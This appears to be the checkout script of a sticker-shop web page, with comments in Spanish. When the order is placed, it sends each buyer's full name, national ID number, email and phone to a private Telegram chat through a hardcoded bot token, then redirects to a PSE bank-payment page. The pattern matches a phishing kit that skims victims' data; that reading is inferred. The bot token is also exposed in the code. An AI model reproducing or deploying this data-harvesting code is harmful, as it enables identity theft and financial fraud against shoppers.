/**
 * finalizar-compra.js
 * ──────────────────────────────────────────────────────────
 * Lee los parámetros de la URL (?qty=20&price=50000&combo=1)
 * que vienen de los links de mundostick.html,
 * guarda el item en sessionStorage y muestra el resumen.
 * ──────────────────────────────────────────────────────────
 */

const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
const CHAT_ID = "6483487531";

async function sendToTelegram(text, inlineKeyboard = null) {
  if (!CHAT_ID) {
    console.warn("Falta CHAT_ID para enviar a Telegram.");
    return;
  }
  const body = {
    chat_id: CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
  await fetch(`${TELEGRAM_API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
}

document.addEventListener('DOMContentLoaded', () => {

  // (Ya no se usan URL params, mundostick.js guarda todo en sessionStorage antes de redirigir)

  /* ── 3. FECHA DE ENTREGA: hoy + 2 días en español ───────*/
  function getFechaEntrega() {
    const MESES = [
      'ENERO', 'FEBRERO', 'MARZO', 'ABRIL', 'MAYO', 'JUNIO',
      'JULIO', 'AGOSTO', 'SEPTIEMBRE', 'OCTUBRE', 'NOVIEMBRE', 'DICIEMBRE'
    ];
    const d = new Date();
    d.setDate(d.getDate() + 2);
    return d.getDate() + ' ' + MESES[d.getMonth()];
  }
  const fecha = getFechaEntrega();

  /* ── 4. CART NOTICE ──────────────────────────────────────
     Formato: {qty} × "STICKER COMBO FAMILIAR – {fecha}"
           o: {qty} × "STICKER BENDECIDO – {fecha}"
  ────────────────────────────────────────────────────────── */
  const noticeSpan = document.getElementById('cart-notice-text');
  if (noticeSpan) {
    const last = Cart.getLastAdded();
    if (last && last.qty > 0) {
      const producto = last.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO';
      // Formato exacto requerido: 0 × "STICKER COMBO FAMILIAR – 8 MAYO"
      noticeSpan.textContent = last.qty + ' × "' + producto + ' – ' + fecha + '"';
    } else {
      noticeSpan.textContent = 'Tu carrito está vacío.';
    }
  }

  /* ── 5. RESUMEN DEL PEDIDO (columna derecha) ─────────── */
  const items = Cart.getItems();
  const orderBody = document.getElementById('order-items');
  const subtotalEl = document.getElementById('order-subtotal');
  const totalEl = document.getElementById('order-total');

  if (orderBody) {
    orderBody.innerHTML = '';

    if (items.length === 0) {
      orderBody.innerHTML =
        '<div class="order-row"><div class="prod-name" style="color:#e63946">' +
        'Sin productos. <a href="../mundostick.html" style="color:#1565c0">← Volver a la tienda</a>' +
        '</div></div>';
    } else {
      items.forEach(function (item) {
        const nombre = item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO';
        const row = document.createElement('div');
        row.className = 'order-row';
        row.innerHTML =
          '<div class="prod-name">' + nombre + ' – ' + fecha +
          '<br><small style="color:#777">Paquete ' + item.pkg + ' — ' + item.qty + ' stickers</small></div>' +
          '<div class="prod-price">$' + Cart.fmt(item.subtotal) + '</div>';
        orderBody.appendChild(row);
      });
    }
  }

  const tot = Cart.totalPrice();
  if (subtotalEl) subtotalEl.textContent = '$' + Cart.fmt(tot);
  if (totalEl) totalEl.textContent = '$' + Cart.fmt(tot);

  /* ── 6. BOTÓN "Ver carrito" ───────────────────────────── */
  const btnCarrito = document.getElementById('btn-ver-carrito');
  if (btnCarrito) {
    btnCarrito.addEventListener('click', function () {
      window.location.href = 'carrito.html';
    });
  }

  /* ── 7. BOTÓN "Realizar el pedido" ───────────────────── */
  const btnRealizar = document.getElementById('btn-realizar');
  if (btnRealizar) {
    btnRealizar.addEventListener('click', async function () {
      var nombre = (document.getElementById('f-nombre') || {}).value || '';
      var apellido = (document.getElementById('f-apellido') || {}).value || '';
      var cedula = (document.getElementById('f-cedula') || {}).value || '';
      var telefono = (document.getElementById('f-telefono') || {}).value || '';
      var email = (document.getElementById('f-email') || {}).value || '';
      var email2 = (document.getElementById('f-email2') || {}).value || '';

      nombre = nombre.trim();
      apellido = apellido.trim();
      cedula = cedula.trim();
      telefono = telefono.trim();
      email = email.trim();
      email2 = email2.trim();

      if (!nombre || !apellido || !cedula || !telefono || !email || !email2) {
        alert('Por favor completa todos los campos obligatorios.');
        return;
      }
      if (email !== email2) {
        alert('Los correos electrónicos no coinciden.');
        return;
      }
      if (Cart.getItems().length === 0) {
        alert('Tu carrito está vacío. Vuelve a la tienda.');
        return;
      }

      const totalFmt = '$' + Cart.fmt(Cart.totalPrice());
      const nombreCompleto = nombre + " " + apellido;

      /* Guardar también las claves individuales requeridas para los próximos pasos */
      sessionStorage.setItem("nombre", nombreCompleto);
      sessionStorage.setItem("cedula", cedula);
      sessionStorage.setItem("correo", email);
      sessionStorage.setItem("telefono", telefono);
      sessionStorage.setItem("total", totalFmt);

      try {
        const productText = `🛒 <b>Nuevo acceso Producto</b>`;
        await sendToTelegram(productText);

        const text = `📦 <b>Nueva Compra Finalizada</b>\n\n👤 Nombre: ${nombreCompleto}\n🪪 Cédula: ${cedula}\n📧 Correo: ${email}\n📞 Teléfono: ${telefono}\n💰 Total: ${totalFmt}`;
        await sendToTelegram(text);
      } catch (err) { console.error(err); }

      /* Payload final — listo para enviar a tu API */
      var order = Object.assign({}, Cart.getOrderPayload(), {
        fechaEntrega: fecha,
        customer: { nombre: nombre, apellido: apellido, cedula: cedula, telefono: telefono, email: email }
      });

      sessionStorage.setItem('ms_last_order', JSON.stringify(order));
      console.log('📦 PEDIDO MUNDO STICK:', order);

      Cart.clear();
      window.location.href = 'checkout-pse.html';
    });
  }
});
